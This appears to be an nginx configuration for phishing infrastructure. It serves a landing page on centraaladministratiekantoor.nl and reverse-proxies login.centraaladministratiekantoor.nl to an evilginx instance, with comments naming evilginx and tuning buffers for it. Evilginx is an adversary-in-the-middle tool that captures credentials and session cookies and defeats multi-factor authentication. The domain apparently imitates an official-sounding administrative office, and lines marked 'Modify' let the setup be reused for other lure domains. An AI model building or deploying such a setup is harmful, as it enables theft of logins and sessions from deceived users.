real_ip_header CF-Connecting-IP;
real_ip_recursive on;


# Catch-all HTTP -> HTTPS
server {
    listen 80 default_server;
    server_name _;

    # Preserve URI and redirect everything to HTTPS
    return 301 https://$host$request_uri;
}

# ------------------------------
# (www.)domein.nl (landing page)
# ------------------------------
server {
    listen 443 ssl;
    server_name centraaladministratiekantoor.nl www.centraaladministratiekantoor.nl; # Modify

    root /var/www/html/centraaladministratiekantoor.nl; # Modify
    index index.html;

    # Self signed ssl certs
    ssl_certificate     /etc/nginx/certs/tls.crt;
    ssl_certificate_key /etc/nginx/certs/tls.key;

    # Logging
    access_log /var/log/nginx/access.log custom_log;
    error_log  /var/log/nginx/error.log warn;

    # Deny access to hidden files / config / VCS
    location ~ /\.(?!well-known) {
        deny all;
    }

    # Serve static files efficiently
    location / {
        try_files $uri $uri/ =404;
    }
}


# ------------------------------
# subdomein2.domein.nl (proxy to evilginx)
# ------------------------------
server {
    listen 443 ssl;
    server_name login.centraaladministratiekantoor.nl; # Modify

    ssl_certificate     /etc/nginx/certs/tls.crt;
    ssl_certificate_key /etc/nginx/certs/tls.key;

    # Logging
    access_log /var/log/nginx/access.log custom_log;
    error_log  /var/log/nginx/error.log warn;

    # Bigger proxy buffers for evilginx
    proxy_buffer_size       128k;
    proxy_buffers           4 256k;
    proxy_busy_buffers_size 256k;

    # Reverse proxy to localhost:443 (HTTPS upstream)
    location / {
        proxy_pass https://192.168.100.10:443;

        # Preserve original host and client info
        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;

        # Preserve SSL properties otherwise evilginx will fail
        proxy_ssl_server_name on;
        proxy_ssl_name $host;
        proxy_ssl_verify off;
    }
}